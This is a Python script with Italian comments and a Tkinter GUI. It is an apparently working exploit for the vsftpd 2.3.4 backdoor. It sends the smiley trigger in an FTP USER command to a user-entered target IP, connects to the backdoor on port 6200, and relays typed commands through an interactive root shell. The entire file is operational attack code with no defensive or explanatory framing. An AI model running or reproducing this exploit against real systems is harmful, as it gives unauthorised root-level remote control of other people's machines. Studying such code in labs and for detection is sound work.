import socket
import time
import os
import sys
import threading
import tkinter as tk
from tkinter import messagebox

# Funzione per attivare la backdoor
def activate_backdoor(target_ip, ftp_port=21):
    try:
        print("[*] Connessione al servizio FTP...")
        ftp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_sock.connect((target_ip, ftp_port))

        # Ricezione del banner
        banner = ftp_sock.recv(1024).decode()
        print(f"[+] Banner ricevuto: {banner.strip()}")

        # Invio della backdoor string "USER test:)"
        print("[*] Invio del comando USER per attivare la backdoor...")
        ftp_sock.send(b"USER test:)\r\n")
        time.sleep(0.5)

        # Invio del comando PASS
        ftp_sock.send(b"PASS test\r\n")
        time.sleep(1)
        ftp_sock.close()
        print("[+] Backdoor attivata con successo!")
    except Exception as e:
        print("[-] Errore nell'attivazione della backdoor:", e)
        sys.exit(1)

# Funzione per aprire una shell interattiva
def interactive_shell(target_ip, backdoor_port=6200):
    print("[*] Tentativo di connessione alla backdoor sulla porta 6200...")
    time.sleep(2)

    try:
        backdoor_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_sock.connect((target_ip, backdoor_port))
        print("[+] Connessione alla shell interattiva stabilita!")

        username = "root"

        # Funzione per leggere l'output remoto
        def read_from_target():
            while True:
                data = backdoor_sock.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode())
                sys.stdout.flush()
                sys.stdout.write(f"\n{username}@{target_ip} # ")
                sys.stdout.flush()

        # Avvia il thread per leggere l'output del target
        thread = threading.Thread(target=read_from_target, daemon=True)
        thread.start()

        # Gestione input utente
        while True:
            try:
                command = input(f"{username}@{target_ip} # ").strip()
                if command.lower() in ['exit', 'quit']:
                    print("[*] Chiusura della connessione...")
                    break
                backdoor_sock.send(command.encode() + b"\n")
            except KeyboardInterrupt:
                print("\n[*] Interruzione della connessione...")
                backdoor_sock.close()
                break

    except Exception as e:
        print("[-] Errore durante la connessione alla backdoor:", e)
        sys.exit(1)

# Funzione principale che integra GUI e exploit
def run_exploit():
    target_ip = ip_entry.get()
    if not target_ip:
        messagebox.showerror("Errore", "Inserisci un indirizzo IP valido!")
        return

    try:
        print(f"[+] Target selezionato: {target_ip}")
        activate_backdoor(target_ip)
        interactive_shell(target_ip)
    except Exception as e:
        messagebox.showerror("Errore", f"Impossibile eseguire l'exploit: {e}")

# Creazione della GUI
root = tk.Tk()
root.title("FTP 2.3.4 Exploit")
root.geometry("400x200")

# Etichette e campi input
tk.Label(root, text="FTP 2.3.4 Backdoor Exploit", font=("Helvetica", 14)).pack(pady=10)
tk.Label(root, text="Inserisci l'indirizzo IP del target:").pack()

ip_entry = tk.Entry(root, width=30)
ip_entry.pack(pady=5)

# Pulsante per eseguire l'exploit
tk.Button(root, text="Esegui Exploit", command=run_exploit, bg="red", fg="white").pack(pady=10)

# Avvio della GUI
root.mainloop()
